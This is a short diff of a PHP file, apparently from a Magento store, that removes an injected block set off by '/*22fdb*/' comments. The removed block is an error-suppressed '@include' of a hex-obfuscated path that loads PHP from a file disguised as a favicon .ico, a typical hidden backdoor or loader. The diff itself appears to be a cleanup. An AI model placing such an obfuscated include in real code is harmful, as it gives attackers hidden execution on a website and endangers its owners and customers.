@@ -1,9 +1,5 @@
 <?php
-/*22fdb*/
 
-@include "\x2fdata\x2fvhos\x74s/ww\x77.os-\x73tore\x2ecom/\x6ez/js\x2fbizt\x65ch/f\x61vico\x6e_037\x3993.i\x63o";
-
-/*22fdb*/
 /**
  * Magento
  *
